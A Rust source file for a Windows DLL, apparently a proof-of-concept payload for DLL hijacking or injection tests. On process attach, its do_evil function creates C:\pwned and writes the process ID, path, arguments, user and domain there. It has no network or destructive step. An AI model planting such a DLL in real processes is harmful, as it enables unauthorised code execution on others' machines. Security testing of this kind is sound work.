#![cfg(windows)]

use std::io::Write;
use winapi::shared::minwindef;
use winapi::shared::minwindef::{BOOL, DWORD, HINSTANCE, LPVOID};
use std::fs::File;
use std::env;
use std::fs;

/// Entry point which will be called by the system once the DLL has been loaded
/// in the target process. Declaring this function is optional.
///
/// # Safety
///
/// What you can safely do inside here is very limited, see the Microsoft documentation
/// about "DllMain". Rust also doesn't officially support a "life before main()",
/// though it is unclear what that that means exactly for DllMain.
#[no_mangle]
#[allow(non_snake_case, unused_variables)]
extern "system" fn DllMain(
    dll_module: HINSTANCE,
    call_reason: DWORD,
    reserved: LPVOID)
    -> BOOL
{
    const DLL_PROCESS_ATTACH: DWORD = 1;
    const DLL_PROCESS_DETACH: DWORD = 0;

    match call_reason {
        DLL_PROCESS_ATTACH => do_evil(),
        DLL_PROCESS_DETACH => (),
        _ => ()
    }
    minwindef::TRUE
}

fn do_evil() {
    let pwned_path = "c:\\pwned";
    fs::create_dir_all(pwned_path).unwrap();
    let pid = std::process::id().to_string();
    let username = env::var("USERNAME").unwrap();
    let domain = env::var("USERDOMAIN").unwrap();
    let path = format!("{}\\pwned_{}.txt", pwned_path, pid);
    let process_path = std::env::current_exe().unwrap();
    let args: Vec<String> = std::env::args().collect();

    let ss = format!(r"[*]          Pid: {:?}
[*]      Process: {:?}
[*]         Args: {:?}
[*]         User: {:?}
[*]       Domain: {:?}
[*] Created file: {:?}
", 
            pid,
            process_path, 
            &args[1..],
            username, 
            domain,
            path);
    println!("{}", ss);
    
    let mut file = File::create(path).unwrap();
    file.write_all(ss.as_bytes()).unwrap();
}
